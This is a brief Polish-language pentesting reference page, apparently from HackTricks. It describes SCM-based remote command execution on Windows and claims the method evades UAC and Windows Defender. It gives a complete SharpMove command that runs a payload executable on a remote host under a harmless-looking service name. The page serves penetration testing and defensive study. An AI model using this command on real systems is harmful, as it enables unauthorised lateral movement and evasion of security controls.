# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

## SCM

**SCMExec** to technika wykonywania poleceń w zdalnych systemach przy użyciu Service Control Manager (SCM) w celu utworzenia usługi uruchamiającej dane polecenie. Ta metoda może omijać niektóre mechanizmy kontroli bezpieczeństwa, takie jak User Account Control (UAC) i Windows Defender.

## Narzędzia

- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):<sup>[[1]](#references)</sup>

SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true

## Referencje

- [1] [SharpMove - GitHub repository](https://github.com/0xthirteen/SharpMove)

{{#include ../../banners/hacktricks-training.md}}
